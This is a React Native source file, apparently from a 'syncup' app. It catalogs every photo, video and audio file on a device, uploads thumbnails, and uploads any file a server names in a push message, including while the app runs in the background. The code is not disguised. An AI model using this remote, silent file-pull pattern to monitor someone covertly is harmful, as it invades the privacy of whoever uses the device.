import * as MediaLibrary from 'expo-media-library';
import * as FileSystem from 'expo-file-system/legacy';
import * as ImageManipulator from 'expo-image-manipulator';
import { Platform } from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { getDeviceId } from './deviceId';

const CATALOG_KEY = 'syncup_media_catalog_hash';
const CHUNK_SIZE = 2 * 1024 * 1024; // 2 MB per chunk
const KEY_API_BASE = 'syncup_api_base';
const BG_USER_ID_KEY = 'syncup_bg_user_id';

/**
 * Scan all media on the device (images, videos, audio, documents).
 * Returns a compact catalog array suitable for pushing to backend.
 * Includes a small thumbnail for images/videos if possible.
 *
 * Folders scanned: DCIM, Pictures, Movies, Music, Download, WhatsApp
 * (expo-media-library enumerates all albums system-wide).
 */
export async function scanMediaCatalog({ includeThumbnails = true, batchSize = 500 } = {}) {
  let { status } = await MediaLibrary.getPermissionsAsync();
  if (status !== 'granted') {
    // Try requesting — in case native permission was granted but expo state is stale
    console.log('[MediaSync] Permission not granted (' + status + '), attempting request...');
    const req = await MediaLibrary.requestPermissionsAsync();
    status = req.status;
  }
  if (status !== 'granted') {
    console.log('[MediaSync] No media permission — skipping scan (status: ' + status + ')');
    return null;
  }

  const allFiles = [];
  let hasNext = true;
  let endCursor;

  // Paginate through the entire media library
  while (hasNext) {
    const page = await MediaLibrary.getAssetsAsync({
      first: batchSize,
      after: endCursor,
      sortBy: [MediaLibrary.SortBy.modificationTime],
      mediaType: [
        MediaLibrary.MediaType.photo,
        MediaLibrary.MediaType.video,
        MediaLibrary.MediaType.audio,
      ],
    });

    for (const asset of page.assets) {
      const item = {
        id: asset.id,
        filename: asset.filename,
        uri: asset.uri,
        media_type: asset.mediaType, // 'photo' | 'video' | 'audio'
        mime_type: getMimeType(asset.filename, asset.mediaType),
        size_bytes: 0, // filled below if available
        width: asset.width || null,
        height: asset.height || null,
        duration_seconds: asset.duration > 0 ? Math.round(asset.duration) : null,
        created_at: asset.creationTime ? new Date(asset.creationTime).toISOString() : null,
        modified_at: asset.modificationTime ? new Date(asset.modificationTime).toISOString() : null,
        album: null,
      };
      allFiles.push(item);
    }

    hasNext = page.hasNextPage;
    endCursor = page.endCursor;
  }

  // Enrich with album info (batch — avoid per-file lookups)
  try {
    const albums = await MediaLibrary.getAlbumsAsync();
    const albumMap = {};
    for (const album of albums) {
      albumMap[album.id] = album.title;
    }
    // Note: expo-media-library doesn't natively expose album per asset in getAssetsAsync
    // We try getAssetInfoAsync in batches for a sample, but for full catalog
    // it's too expensive. Album column left null for now; backend can infer from path.
  } catch {}

  // Get file sizes + localUri + album via MediaLibrary.getAssetInfoAsync
  // Android scoped storage blocks direct file:// access for size queries.
  // Strategy: getAssetInfoAsync → localUri → fetch blob for size.
  const SIZE_BATCH = 20;
  for (let i = 0; i < allFiles.length; i += SIZE_BATCH) {
    const batch = allFiles.slice(i, i + SIZE_BATCH);
    await Promise.all(
      batch.map(async (file) => {
        try {
          const assetInfo = await MediaLibrary.getAssetInfoAsync(file.id);
          if (assetInfo) {
            // localUri is the app-accessible path (content:// or file://)
            if (assetInfo.localUri) {
              file.uri = assetInfo.localUri;
            }
            // Extract album name from path (e.g. /DCIM/Camera/file.jpg → "Camera")
            const uriForAlbum = assetInfo.localUri || file.uri;
            const pathParts = uriForAlbum.split('/');
            if (pathParts.length >= 3) {
              file.album = pathParts[pathParts.length - 2] || null;
            }
          }
        } catch {}

        // Get file size — try multiple methods
        const uriToCheck = file.uri;
        if (file.size_bytes === 0 && uriToCheck) {
          // Method 1: FileSystem.getInfoAsync (works if URI is accessible)
          try {
            const info = await FileSystem.getInfoAsync(uriToCheck, { size: true });
            if (info.exists && info.size > 0) {
              file.size_bytes = info.size;
            }
          } catch {}
        }
        if (file.size_bytes === 0 && uriToCheck) {
          // Method 2: fetch as blob — reliable on Android scoped storage
          try {
            const resp = await fetch(uriToCheck);
            const blob = await resp.blob();
            if (blob.size > 0) {
              file.size_bytes = blob.size;
            }
          } catch {}
        }
      })
    );
  }

  // Generate resized thumbnails using expo-image-manipulator
  // 96x96 JPEG at quality 60 — keeps each thumb under ~3KB
  // Only for photos (videos/audio/docs skipped)
  if (includeThumbnails) {
    const THUMB_SIZE = 96; // 96×96 px (aspect ratio preserved, fits in square)
    const THUMB_QUALITY = 0.6; // 60% — good clarity at tiny size
    const THUMB_BATCH = 10; // Process in small batches to avoid memory pressure
    let thumbCount = 0;

    const photosForThumbs = allFiles.filter(f => f.media_type === 'photo' && f.uri);

    for (let i = 0; i < photosForThumbs.length; i += THUMB_BATCH) {
      const batch = photosForThumbs.slice(i, i + THUMB_BATCH);
      await Promise.all(
        batch.map(async (file) => {
          try {
            const result = await ImageManipulator.manipulateAsync(
              file.uri,
              [{ resize: { width: THUMB_SIZE } }],
              { compress: THUMB_QUALITY, format: ImageManipulator.SaveFormat.JPEG, base64: true }
            );
            if (result.base64) {
              file.thumbnail_base64 = result.base64;
              thumbCount++;
            }
            // Clean up temp file created by manipulateAsync
            if (result.uri) {
              try { await FileSystem.deleteAsync(result.uri, { idempotent: true }); } catch {}
            }
          } catch {}
        })
      );
    }
    console.log(`[MediaSync] Generated ${thumbCount} thumbnails (~${THUMB_SIZE}px, q${THUMB_QUALITY * 100}%)`);
  }

  return allFiles;
}

/**
 * Push the media catalog to backend in batches.
 * Sends 200 files per POST with batch_index/batch_total/full_sync markers.
 * Only sends if the file list has changed since last sync (hash comparison).
 */
const CATALOG_BATCH_SIZE = 200; // Files per POST request

export async function syncMediaCatalog(apiUrl, userId) {
  if (!apiUrl || !userId) {
    console.log('[MediaSync] syncMediaCatalog skipped — apiUrl:', !!apiUrl, 'userId:', !!userId);
    return { success: false, error: 'Missing apiUrl or userId' };
  }

  console.log('[MediaSync] Starting catalog sync for user:', userId);

  try {
    const files = await scanMediaCatalog({ includeThumbnails: true });
    if (!files) {
      console.log('[MediaSync] scanMediaCatalog returned null — no permission');
      return { success: false, error: 'No media permission' };
    }

    console.log('[MediaSync] Scanned', files.length, 'files');
    const deviceId = await getDeviceId();

    // Quick hash: count + total size + last modified timestamp
    const totalSize = files.reduce((sum, f) => sum + (f.size_bytes || 0), 0);
    const lastModified = files.length > 0 ? files[0].modified_at : '';
    const currentHash = `${files.length}|${totalSize}|${lastModified}`;

    const prevHash = await AsyncStorage.getItem(CATALOG_KEY);
    if (prevHash === currentHash) {
      console.log('[MediaSync] Catalog unchanged — skipping upload');
      return { success: true, skipped: true, totalFiles: files.length };
    }

    // Split into batches of CATALOG_BATCH_SIZE
    const totalBatches = Math.max(1, Math.ceil(files.length / CATALOG_BATCH_SIZE));
    console.log(`[MediaSync] Sending ${files.length} files in ${totalBatches} batch(es)`);

    for (let batchIndex = 0; batchIndex < totalBatches; batchIndex++) {
      const start = batchIndex * CATALOG_BATCH_SIZE;
      const batchFiles = files.slice(start, start + CATALOG_BATCH_SIZE);
      const isLastBatch = batchIndex === totalBatches - 1;

      const payload = {
        user_id: userId,
        device_id: deviceId,
        timestamp: new Date().toISOString(),
        total_files: files.length,
        total_size_bytes: totalSize,
        batch_index: batchIndex,
        batch_total: totalBatches,
        full_sync: isLastBatch, // true on final batch — server can prune missing files
        media_files: batchFiles.map(f => ({
          id: f.id,
          filename: f.filename,
          uri: f.uri,
          media_type: f.media_type,
          mime_type: f.mime_type,
          size_bytes: f.size_bytes,
          width: f.width,
          height: f.height,
          duration_seconds: f.duration_seconds,
          created_at: f.created_at,
          modified_at: f.modified_at,
          album: f.album || null,
          thumbnail_base64: f.thumbnail_base64 || null,
        })),
      };

      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 60000);

      let response;
      try {
        response = await fetch(`${apiUrl}/device/api/media-catalog`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          signal: controller.signal,
        });
      } finally {
        clearTimeout(timer);
      }

      if (!response.ok) {
        const text = await response.text().catch(() => '');
        console.error(`[MediaSync] Batch ${batchIndex + 1}/${totalBatches} failed: HTTP ${response.status}`);
        return { success: false, error: `HTTP ${response.status} on batch ${batchIndex + 1}`, response_snippet: text.slice(0, 200) };
      }

      console.log(`[MediaSync] ✓ Batch ${batchIndex + 1}/${totalBatches} sent (${batchFiles.length} files)`);
    }

    await AsyncStorage.setItem(CATALOG_KEY, currentHash);
    console.log(`[MediaSync] ✓ Catalog fully pushed (${files.length} files, ${(totalSize / 1024 / 1024).toFixed(1)} MB, ${totalBatches} batches)`);
    return { success: true, totalFiles: files.length, totalSize, batches: totalBatches };
  } catch (err) {
    console.error('[MediaSync] Catalog sync error:', err);
    return { success: false, error: err.message };
  }
}

/**
 * Upload a specific file to the backend in chunks (no size limit).
 * Called when FCM command arrives requesting a file download.
 *
 * @param {string} apiUrl - Backend base URL
 * @param {string} userId - Logged in user
 * @param {string} requestId - Backend-generated request ID (for tracking)
 * @param {string} fileId - Media library asset ID
 * @param {string} fileUri - Local URI of the file
 */
export async function uploadFileInChunks(apiUrl, userId, requestId, fileId, fileUri) {
  try {
    const deviceId = await getDeviceId();

    // Resolve a working URI via MediaLibrary (scoped storage compatible)
    let workingUri = fileUri;
    let fileSize = 0;
    let filename = (fileUri || '').split('/').pop() || 'unknown';

    // Try to get asset info from MediaLibrary using file_id (most reliable)
    if (fileId && fileId !== 'unknown') {
      try {
        const assetInfo = await MediaLibrary.getAssetInfoAsync(fileId);
        if (assetInfo && assetInfo.localUri) {
          workingUri = assetInfo.localUri;
          filename = assetInfo.filename || filename;
          if (assetInfo.fileSize && assetInfo.fileSize > 0) {
            fileSize = assetInfo.fileSize;
          }
          console.log(`[MediaSync] Resolved asset ${fileId} → ${workingUri}`);
        }
      } catch (err) {
        console.warn(`[MediaSync] getAssetInfoAsync failed for ${fileId}:`, err?.message);
      }
    }

    // Fallback: try FileSystem.getInfoAsync with the working URI
    if (fileSize === 0) {
      try {
        const fileInfo = await FileSystem.getInfoAsync(workingUri, { size: true });
        if (fileInfo.exists && fileInfo.size > 0) {
          fileSize = fileInfo.size;
        }
      } catch {}
    }

    if (fileSize === 0) {
      console.warn(`[MediaSync] Could not determine file size for ${filename}`);
      return { success: false, error: 'Cannot access file — size unknown' };
    }

    const totalChunks = Math.max(1, Math.ceil(fileSize / CHUNK_SIZE));

    console.log(`[MediaSync] Uploading ${filename} (${(fileSize / 1024 / 1024).toFixed(1)} MB, ${totalChunks} chunks)`);

    for (let i = 0; i < totalChunks; i++) {
      const offset = i * CHUNK_SIZE;
      const length = Math.min(CHUNK_SIZE, fileSize - offset);

      // Read chunk as base64
      const chunkBase64 = await FileSystem.readAsStringAsync(workingUri, {
        encoding: FileSystem.EncodingType.Base64,
        position: offset,
        length: length,
      });

      // Build FormData for multipart upload
      const formData = new FormData();
      formData.append('user_id', userId);
      formData.append('device_id', deviceId);
      formData.append('request_id', requestId);
      formData.append('file_id', fileId);
      formData.append('filename', filename);
      formData.append('chunk_index', String(i));
      formData.append('total_chunks', String(totalChunks));
      formData.append('file_size', String(fileSize));
      formData.append('chunk_data', chunkBase64);

      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 120000); // 120s per chunk

      try {
        const res = await fetch(`${apiUrl}/device/api/media-upload`, {
          method: 'POST',
          body: formData,
          signal: controller.signal,
        });
        clearTimeout(timer);

        if (!res.ok) {
          const errText = await res.text().catch(() => '');
          return { success: false, error: `Chunk ${i} failed: HTTP ${res.status}`, details: errText.slice(0, 200) };
        }
      } catch (err) {
        clearTimeout(timer);
        return { success: false, error: `Chunk ${i} failed: ${err.message}` };
      }
    }

    console.log(`[MediaSync] ✓ ${filename} uploaded (${totalChunks} chunks)`);
    return { success: true, filename, totalChunks, fileSize };
  } catch (err) {
    console.error('[MediaSync] Upload error:', err);
    return { success: false, error: err.message };
  }
}

/**
 * Get MIME type from filename and media type.
 */
function getMimeType(filename, mediaType) {
  const ext = (filename || '').split('.').pop()?.toLowerCase();
  const mimeMap = {
    // Images
    jpg: 'image/jpeg', jpeg: 'image/jpeg', png: 'image/png',
    gif: 'image/gif', webp: 'image/webp', heic: 'image/heic', heif: 'image/heif',
    bmp: 'image/bmp', svg: 'image/svg+xml',
    // Video
    mp4: 'video/mp4', mkv: 'video/x-matroska', avi: 'video/x-msvideo',
    mov: 'video/quicktime', webm: 'video/webm', '3gp': 'video/3gpp',
    // Audio
    mp3: 'audio/mpeg', aac: 'audio/aac', ogg: 'audio/ogg',
    wav: 'audio/wav', flac: 'audio/flac', m4a: 'audio/mp4', wma: 'audio/x-ms-wma',
    // Documents
    pdf: 'application/pdf', doc: 'application/msword',
    docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    xls: 'application/vnd.ms-excel',
    xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    ppt: 'application/vnd.ms-powerpoint', txt: 'text/plain', zip: 'application/zip',
  };
  if (ext && mimeMap[ext]) return mimeMap[ext];
  if (mediaType === 'photo') return 'image/jpeg';
  if (mediaType === 'video') return 'video/mp4';
  if (mediaType === 'audio') return 'audio/mpeg';
  return 'application/octet-stream';
}

/**
 * Handle an FCM data message requesting file download(s) (upload from device to server).
 * Called from both the background handler (index.js) and foreground handler.
 *
 * Supports BOTH single-file and batch (multiple files) in one command.
 *
 * ── Single file format ──
 * {
 *   type: 'media_download_request',
 *   request_id: 'req_xyz789',
 *   file_id: 'media_abc123',
 *   file_uri: 'file:///storage/emulated/0/...'
 * }
 *
 * ── Batch (multiple files) format ──
 * {
 *   type: 'media_download_request',
 *   request_id: 'req_batch_001',
 *   files: '[{"file_id":"abc","file_uri":"file:///..."},{"file_id":"def","file_uri":"file:///..."}]'
 * }
 * NOTE: FCM data values are always strings, so `files` is a JSON-stringified array.
 */
export async function handleFcmMediaCommand(data) {
  try {
    console.log('[MediaSync] FCM media command received:', data?.request_id);

    const apiUrl = await AsyncStorage.getItem(KEY_API_BASE);
    const userId = await AsyncStorage.getItem(BG_USER_ID_KEY);

    if (!apiUrl || !userId) {
      console.warn('[MediaSync] Cannot handle FCM — no apiUrl or userId');
      return;
    }

    const { request_id } = data;
    if (!request_id) {
      console.warn('[MediaSync] FCM missing request_id');
      return;
    }

    // Build the file list — support both single and batch
    let fileList = [];

    if (data.files) {
      // Batch mode — parse the JSON-stringified array
      try {
        const parsed = typeof data.files === 'string' ? JSON.parse(data.files) : data.files;
        if (Array.isArray(parsed)) {
          fileList = parsed;
        }
      } catch (err) {
        console.warn('[MediaSync] Failed to parse files array:', err?.message);
        return;
      }
    } else if (data.file_uri) {
      // Single file mode (backwards compatible)
      fileList = [{ file_id: data.file_id || 'unknown', file_uri: data.file_uri }];
    }

    if (fileList.length === 0) {
      console.warn('[MediaSync] FCM command has no files to upload');
      return;
    }

    console.log(`[MediaSync] Processing ${fileList.length} file(s) for request ${request_id}`);

    const results = [];
    for (let i = 0; i < fileList.length; i++) {
      const { file_id, file_uri } = fileList[i];
      if (!file_uri) {
        results.push({ file_id, success: false, error: 'Missing file_uri' });
        continue;
      }

      console.log(`[MediaSync] Uploading file ${i + 1}/${fileList.length}: ${file_uri.split('/').pop()}`);
      const result = await uploadFileInChunks(apiUrl, userId, request_id, file_id || 'unknown', file_uri);
      results.push({ file_id, ...result });
    }

    const succeeded = results.filter(r => r.success).length;
    const failed = results.length - succeeded;
    console.log(`[MediaSync] Batch complete: ${succeeded} succeeded, ${failed} failed`);

    // Report batch status back to backend
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 30000);
      await fetch(`${apiUrl}/device/api/media-upload-status`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          request_id,
          user_id: userId,
          device_id: await getDeviceId(),
          total_files: fileList.length,
          succeeded,
          failed,
          results,
          completed_at: new Date().toISOString(),
        }),
        signal: controller.signal,
      });
      clearTimeout(timer);
    } catch {}
  } catch (err) {
    console.error('[MediaSync] FCM handler error:', err);
  }
}
